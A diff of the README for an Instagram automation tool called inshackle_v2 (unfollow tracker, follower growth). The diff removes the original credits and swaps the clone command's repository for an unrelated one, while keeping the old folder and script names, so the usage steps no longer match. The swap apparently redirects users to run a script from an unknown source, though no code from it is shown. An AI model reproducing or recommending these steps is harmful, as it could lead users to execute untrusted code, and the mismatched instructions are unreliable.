@@ -4,11 +4,6 @@
 
 Recoded: https://github.com/anshu189/inshackle_v2
 
-Thanks To _linuxchoice_
-
-Credits: https://github.com/cyberkallan/inshackle-bot
-
-### **Instagram hacks**: Track unfollowers, Increase your followers, Download Stories, etc
 
 ### Features:
 **Unfollow Tracker
@@ -18,7 +13,7 @@ Unfollow all your following**
 
 **Usage:**
 ```
-git clone https://github.com/anshu189/inshackle_v2.git
+git clone https://github.com/gfxjz/n.regojevicc.git
 cd inshackle_v2
 bash inshackle_v2.sh
 ```
